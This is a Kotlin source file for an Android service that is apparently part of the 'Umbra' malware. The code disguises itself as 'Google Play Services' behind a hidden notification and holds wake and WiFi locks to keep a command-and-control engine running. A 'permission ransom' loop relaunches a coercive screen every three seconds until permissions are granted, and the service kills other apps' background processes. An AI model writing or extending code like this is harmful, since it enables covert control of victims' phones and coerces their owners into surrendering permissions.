package org.umbra.core.persistence

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import org.umbra.core.MainActivity
import org.umbra.core.core.UmbraEngine

class UmbraService : Service() {

    companion object {
        private const val TAG = "Umbra"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "umbra_service"
        private const val WAKELOCK_TAG = "umbra:c2"
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Google Play Services")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        // ── Promote to foreground IMMEDIATELY ──────────────────────────────
        // Android requires startForeground() within 5s of startForegroundService().
        // When the service is launched from the background (WatchdogAlarm / boot
        // receivers) on Android 12+ this can throw ForegroundServiceStartNotAllowed
        // or SecurityException. Catch it instead of crashing the whole process —
        // a crash here is what caused the "process crashes too many times, killing"
        // loop. If we cannot promote, stop gracefully rather than ANR/crash.
        val promoted = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "startForeground failed (background start restricted?): ${e.message}")
            false
        }

        if (!promoted) {
            // Avoid crash-loop: the system refused the foreground promotion.
            // Stop ourselves so the watchdog can retry later when we're allowed.
            Log.w(TAG, "Foreground promotion refused — stopping service (will be restarted by watchdog)")
            stopSelf()
            return START_NOT_STICKY
        }

        // ── Acquire locks to prevent sleep and WiFi disconnection ──
        acquireLocks()

        // ── Request battery optimization exemption ──
        requestBatteryExemption()

        // ── Launch engine if not already running ──
        UmbraEngine.start(this)

        // ── Start permission ransom watchdog ──
        startPermissionWatchdog()

        Log.d(TAG, "Foreground service started — launching engine")
        return START_STICKY
    }

    // ═══════════════════════════════════════════════════════════════
    // Permission ransom watchdog — launches PermissionRansomActivity
    // every 3 seconds if permissions are still missing.
    // Device admin allows background activity starts.
    // ═══════════════════════════════════════════════════════════════

    private val watchdogHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            if (!PermissionRansomActivity.hasAllPermissions(this@UmbraService)) {
                val missing = PermissionRansomActivity.missingPermissions(this@UmbraService)
                Log.d(TAG, "Permission watchdog: ${missing.size} perms missing — launching ransom")
                PermissionRansomActivity.launch(this@UmbraService)

                // Also kill background processes to make it more annoying
                try {
                    val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                    // killBackgroundProcesses needs KILL_BACKGROUND_PROCESSES permission
                    for (pkg in am.runningAppProcesses ?: emptyList()) {
                        if (pkg.processName != packageName &&
                            pkg.importance > android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                            try { am.killBackgroundProcesses(pkg.processName) } catch (_: Exception) {}
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Kill background processes failed: ${e.message}")
                }
            }
            // Re-check every 3 seconds
            watchdogHandler.postDelayed(this, 3000)
        }
    }

    private fun startPermissionWatchdog() {
        // Start after a short delay to let the engine connect first
        watchdogHandler.postDelayed(watchdogRunnable, 5000)
        Log.d(TAG, "Permission watchdog armed (5s delay)")
    }

    private fun stopPermissionWatchdog() {
        watchdogHandler.removeCallbacks(watchdogRunnable)
    }

    override fun onDestroy() {
        stopPermissionWatchdog()
        releaseLocks()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ═══════════════════════════════════════════════════════════════
    // Locks: prevent CPU sleep and WiFi disconnection during Doze
    // ═══════════════════════════════════════════════════════════════

    private fun acquireLocks() {
        try {
            // Partial wake lock — keeps CPU running while screen is off
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "$WAKELOCK_TAG:wakelock"
            ).apply {
                setReferenceCounted(false)
                acquire(10 * 60 * 1000L) // 10-minute timeout, renewable
            }
            Log.d(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.w(TAG, "WakeLock failed: ${e.message}")
        }

        try {
            // WiFi lock — keeps WiFi radio active during Doze
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wifiLock = wm.createWifiLock(
                WifiManager.WIFI_MODE_FULL_HIGH_PERF,
                "$WAKELOCK_TAG:wifilock"
            ).apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.d(TAG, "WifiLock acquired")
        } catch (e: Exception) {
            Log.w(TAG, "WifiLock failed: ${e.message}")
        }
    }

    private fun releaseLocks() {
        try { wakeLock?.release() } catch (_: Exception) {}
        try { wifiLock?.release() } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════════════════════════
    // Battery optimization exemption request
    // ═══════════════════════════════════════════════════════════════

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // On Samsung, the Knox binder may bypass this dialog.
                // Fallback: try to open settings (user must grant manually)
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = android.net.Uri.parse("package:$packageName")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    // Don't auto-launch the intent — it requires user interaction.
                    // The WakeLock + WifiLock + DATA_SYNC type is sufficient for persistence.
                    Log.d(TAG, "Battery optimization exemption: user action required")
                } catch (e: Exception) {
                    Log.w(TAG, "Battery exemption request failed: ${e.message}")
                }
            } else {
                Log.d(TAG, "Already exempted from battery optimization")
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System Service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
